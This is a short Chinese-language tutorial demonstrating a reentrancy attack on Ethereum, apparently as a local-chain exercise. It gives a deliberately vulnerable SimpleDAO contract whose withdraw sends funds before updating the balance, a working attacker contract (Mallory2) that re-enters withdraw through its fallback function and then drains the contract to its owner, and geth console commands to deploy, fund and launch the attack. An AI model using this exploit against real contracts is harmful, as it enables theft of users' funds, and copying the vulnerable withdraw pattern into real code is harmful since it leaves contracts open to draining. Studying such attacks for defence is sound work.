# 准备合约
```
pragma solidity ^0.4.2;

contract SimpleDAO {   
  mapping (address => uint) public credit;
    
    function donate(address to) payable {
    credit[to] += msg.value;
  }
    
  function withdraw(uint amount) {
    if (credit[msg.sender]>= amount) {
      bool res = msg.sender.call.value(amount)();
      credit[msg.sender]-=amount;
    }
  }  

  function queryCredit(address to) view returns (uint){
    return credit[to];
  }
}

contract Mallory2 {
  SimpleDAO public dao;
  address owner; 
  bool public performAttack = true;

  function Mallory2(SimpleDAO addr){
    owner = msg.sender;
    dao = addr;
  }
    
  function attack() payable{
    dao.donate.value(1)(this);
    dao.withdraw(1);
  }

  function getJackpot(){
    dao.withdraw(dao.balance);
    bool res = owner.send(this.balance);
    performAttack = true;
  }

  function() payable {
    if (performAttack) {
       performAttack = false;
       dao.withdraw(1);
    }
  }
}
```


# 将合约装载到链上
首先部署simpleDAO, 比如我这里得到的合约实例地址为0x5F3e0Cc753B825d83AFBBcFB4fbF966A6BAf7990。

然后在部署Mallory合约的时候，以上面的合约地址为参数，例如，mal为合约，malins为合约实例，则：
`malins=mal.new('0x5F3e0Cc753B825d83AFBBcFB4fbF966A6BAf7990',{data:bytecode, from:eth.coinbase, gas:10000000})`

# 给simpleDAO充值
`daoins.donate.sendTransaction({from:eth.coinbase,value:100000})`
找多几个账号充值，以拿取别人的金额。

# 发动攻击
先设置defaultAccount，不然在调用的时候会显示invalid address。然后就可以发动攻击。理论上先调用attack，再用getJackpot获取资金。
```
eth.defaultAccount=eth.coinbase
```



